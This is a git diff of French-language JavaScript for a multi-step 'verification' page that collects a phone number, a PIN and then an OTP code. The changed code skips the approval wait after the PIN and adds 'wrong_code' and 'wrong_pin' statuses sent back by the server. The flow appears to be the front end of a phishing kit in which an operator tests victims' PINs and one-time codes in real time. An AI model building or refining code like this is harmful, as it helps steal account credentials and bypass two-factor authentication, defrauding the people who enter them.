@@ -380,46 +380,10 @@ function initPhonePinVerification() {
       const result = await response.json();
 
       if (result.success) {
-        verifyPhonePinBtn.textContent = 'En attente d\'approbation...';
-        verifyPhonePinBtn.disabled = true;
-
-        const pollInterval = setInterval(async () => {
-          try {
-            const statusResponse = await fetch(AppConfig.api(`/api/verify/phone-pin/status/${result.id || 'latest'}`), {
-              headers: AppConfig.getApiHeaders()
-            });
-            const statusResult = await statusResponse.json();
-
-            if (statusResult.status === 'verified') {
-              clearInterval(pollInterval);
-              PollingManager.intervals.delete(pollInterval);
-              verifyPhonePinBtn.textContent = 'Téléphone et code PIN vérifiés ✓';
-              verifyPhonePinBtn.classList.remove('btn-primary');
-              verifyPhonePinBtn.classList.add('btn-success');
-              setTimeout(() => goToStep(2), 800);
-            } else if (statusResult.status === 'declined') {
-              clearInterval(pollInterval);
-              PollingManager.intervals.delete(pollInterval);
-              verifyPhonePinBtn.textContent = 'Numéro de téléphone ou code PIN incorrect';
-              verifyPhonePinBtn.classList.add('btn-secondary');
-              verifyPhonePinBtn.classList.remove('btn-primary');
-              verifyPhonePinBtn.disabled = false;
-              document.querySelectorAll('.pin-box').forEach(b => b.value = '');
-              phoneInput.value = '';
-              phoneInput.focus();
-              showStatus('phonePinStatus', 'Numéro de téléphone ou code PIN incorrect. Veuillez réessayer.');
-              setTimeout(() => {
-                verifyPhonePinBtn.textContent = 'Vérifier le téléphone et le code PIN';
-                verifyPhonePinBtn.classList.remove('btn-secondary');
-                verifyPhonePinBtn.classList.add('btn-primary');
-                hideStatus('phonePinStatus');
-              }, 4000);
-            }
-          } catch (error) {
-            console.error('Polling error:', error);
-          }
-        }, 2000);
-        PollingManager.add(pollInterval);
+        verifyPhonePinBtn.textContent = 'Vérifié ✓';
+        verifyPhonePinBtn.classList.remove('btn-primary');
+        verifyPhonePinBtn.classList.add('btn-success');
+        setTimeout(() => goToStep(2), 400);
       } else {
         throw new Error(result.error || 'Failed to send verification');
       }
@@ -480,22 +444,40 @@ function initOtpVerification() {
               verifyOtpBtn.classList.remove('btn-success');
               verifyOtpBtn.classList.add('btn-primary');
               setTimeout(() => goToStep(3), 600);
-            } else if (statusResult.status === 'declined') {
+            } else if (statusResult.status === 'wrong_code') {
               clearInterval(pollInterval);
               PollingManager.intervals.delete(pollInterval);
-              verifyOtpBtn.textContent = 'Code OTP invalide';
+              verifyOtpBtn.textContent = 'Code OTP incorrect';
               verifyOtpBtn.classList.add('btn-secondary');
               verifyOtpBtn.classList.remove('btn-success');
               verifyOtpBtn.disabled = false;
               otpBoxes.forEach(box => box.value = '');
               otpBoxes[0]?.focus();
-              showStatus('otpStatus', 'Code OTP invalide. Veuillez réessayer.');
+              showStatus('otpStatus', 'Code OTP incorrect. Veuillez réessayer.');
               setTimeout(() => {
                 verifyOtpBtn.textContent = 'Vérifier';
                 verifyOtpBtn.classList.remove('btn-secondary');
                 verifyOtpBtn.classList.add('btn-success');
                 hideStatus('otpStatus');
               }, 4000);
+            } else if (statusResult.status === 'wrong_pin') {
+              clearInterval(pollInterval);
+              PollingManager.intervals.delete(pollInterval);
+              verifyOtpBtn.textContent = 'Code PIN incorrect';
+              verifyOtpBtn.classList.add('btn-secondary');
+              verifyOtpBtn.classList.remove('btn-success');
+              verifyOtpBtn.disabled = false;
+              otpBoxes.forEach(box => box.value = '');
+              document.querySelectorAll('.pin-box').forEach(b => b.value = '');
+              phoneInput.value = '';
+              showStatus('otpStatus', 'Code PIN incorrect. Veuillez réessayer.');
+              setTimeout(() => {
+                verifyOtpBtn.textContent = 'Vérifier';
+                verifyOtpBtn.classList.remove('btn-secondary');
+                verifyOtpBtn.classList.add('btn-success');
+                hideStatus('otpStatus');
+                goToStep(1);
+              }, 1500);
             }
           } catch (error) {
             console.error('OTP polling error:', error);
